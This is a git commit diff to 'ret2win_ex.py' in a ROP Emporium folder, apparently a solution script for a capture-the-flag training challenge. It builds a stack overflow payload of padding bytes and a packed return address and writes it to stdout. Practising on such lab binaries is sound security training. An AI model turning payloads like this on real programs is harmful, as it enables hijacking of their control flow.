35d49821b563add356f7516ea229775280dbaa19
Clif Wolfe <34320249+flounderK@users.noreply.github.com>
2019-03-14 20:26:01 -0400

    Update ret2win_ex.py

--- rop_emporium/ret2win_ex.py
+++ rop_emporium/ret2win_ex.py
@@ -1,2 +1,4 @@
-import sys,struct;x=lambda a:struct.pack('I', a).decode('ISO-8859-1');
+#!/usr/bin/python3.7
+import sys,struct;
+x=lambda a:struct.pack('I', a).decode('ISO-8859-1');
 sys.stdout.buffer.write('D'*44 + x(0x08048659) + 'A')
